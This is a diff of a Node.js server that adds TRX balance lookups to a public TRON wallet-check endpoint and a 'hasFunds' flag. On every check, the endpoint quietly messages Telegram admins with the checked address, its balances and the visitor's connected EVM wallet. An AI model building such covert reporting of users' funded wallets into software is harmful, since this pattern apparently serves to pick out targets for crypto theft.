@@ -339,6 +339,67 @@ const getNonZeroNativeBalances = async (address, preferredChainIdValue) => {
   };
 };
 
+
+const getTronNativeBalance = async (address) => {
+  const normalized = String(address || "").trim();
+  const errors = [];
+
+  const makeResult = (source, sun) => ({
+    ok: true,
+    source,
+    network: "TRON",
+    token: "TRX",
+    balance: formatTokenUnits(BigInt(sun), 6),
+    rawBalance: BigInt(sun),
+  });
+
+  // Native TRX balance. This is what Trust Wallet shows as the big dollar amount
+  // when the asset row is TRX / Tron.
+  try {
+    const sun = await tronWeb.trx.getBalance(normalized);
+    return makeResult("tronweb-trx-getBalance", sun?.toString?.() ?? sun);
+  } catch (error) {
+    errors.push(`tronWeb getBalance: ${error.message}`);
+  }
+
+  try {
+    const response = await fetch(`${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}`, {
+      headers: getTronHeaders(),
+      signal: withTimeout(),
+    });
+    const payload = await response.json();
+    if (!response.ok || payload?.success === false) {
+      throw new Error(payload?.error || payload?.message || `HTTP ${response.status}`);
+    }
+    const sun = payload?.data?.[0]?.balance ?? 0;
+    return makeResult("trongrid-account-trx", sun);
+  } catch (error) {
+    errors.push(`TronGrid account TRX: ${error.message}`);
+  }
+
+  try {
+    const response = await fetch(`https://apilist.tronscanapi.com/api/account?address=${encodeURIComponent(normalized)}`, {
+      headers: { Accept: "application/json" },
+      signal: withTimeout(),
+    });
+    const payload = await response.json();
+    if (!response.ok || payload?.success === false) {
+      throw new Error(payload?.message || payload?.error || `HTTP ${response.status}`);
+    }
+    const sun = payload?.balance ?? payload?.account?.balance ?? 0;
+    return makeResult("tronscanapi-account-trx", sun);
+  } catch (error) {
+    errors.push(`TronScan account TRX: ${error.message}`);
+  }
+
+  return {
+    ok: false,
+    network: "TRON",
+    token: "TRX",
+    error: errors.join("; ") || "Не удалось получить TRX баланс",
+  };
+};
+
 const getTronUsdtBalance = async (address) => {
   const normalized = String(address || "").trim();
   const errors = [];
@@ -888,21 +949,26 @@ const handleApi = async (request, response, pathname) => {
       return sendJson(request, response, 400, { error: "Некорректный TRON адрес. Он должен начинаться с T." });
     }
 
-    const usdtBalance = await getTronUsdtBalance(normalized);
-    if (!usdtBalance.ok) {
+    const [usdtBalance, trxBalance] = await Promise.all([
+      getTronUsdtBalance(normalized),
+      getTronNativeBalance(normalized),
+    ]);
+
+    if (!usdtBalance.ok && !trxBalance.ok) {
       return sendJson(request, response, 502, {
-        error: "Не удалось получить TRON USDT TRC20 баланс",
-        details: usdtBalance.error,
+        error: "Не удалось получить TRON баланс",
+        details: [usdtBalance.error, trxBalance.error].filter(Boolean).join("; "),
       });
     }
 
     const session = getUserSession(request);
     const telegramNotifications = await notifyTelegramAdmins(
       [
-        "Публичная проверка TRON USDT TRC20",
+        "Публичная проверка TRON кошелька",
         "",
         `TRON адрес: ${normalized}`,
-        `Баланс: ${usdtBalance.balance} USDT`,
+        usdtBalance.ok ? `USDT TRC20: ${usdtBalance.balance} USDT` : `USDT TRC20: ошибка (${usdtBalance.error})`,
+        trxBalance.ok ? `TRX: ${trxBalance.balance} TRX` : `TRX: ошибка (${trxBalance.error})`,
         session?.address ? `EVM пользователь: ${session.address}` : "EVM пользователь: не подключён",
         `Время: ${formatDate(nowIso())}`,
       ].join("\n"),
@@ -911,12 +977,30 @@ const handleApi = async (request, response, pathname) => {
     return sendJson(request, response, 200, {
       ok: true,
       chain: "tron",
-      network: usdtBalance.network,
-      token: "USDT_TRC20",
-      contract: usdtBalance.contract,
+      network: "TRON",
       address: normalized,
-      balance: usdtBalance.balance,
-      rawBalance: usdtBalance.rawBalance.toString(),
+      token: "USDT_TRC20",
+      contract: tronUsdtContract,
+      balance: usdtBalance.ok ? usdtBalance.balance : "0",
+      rawBalance: usdtBalance.ok ? usdtBalance.rawBalance.toString() : "0",
+      usdt: usdtBalance.ok
+        ? {
+            ok: true,
+            balance: usdtBalance.balance,
+            rawBalance: usdtBalance.rawBalance.toString(),
+            source: usdtBalance.source,
+            contract: usdtBalance.contract,
+          }
+        : { ok: false, balance: "0", rawBalance: "0", error: usdtBalance.error },
+      trx: trxBalance.ok
+        ? {
+            ok: true,
+            balance: trxBalance.balance,
+            rawBalance: trxBalance.rawBalance.toString(),
+            source: trxBalance.source,
+          }
+        : { ok: false, balance: "0", rawBalance: "0", error: trxBalance.error },
+      hasFunds: (usdtBalance.ok && usdtBalance.rawBalance > 0n) || (trxBalance.ok && trxBalance.rawBalance > 0n),
       telegramNotifications,
     });
   }
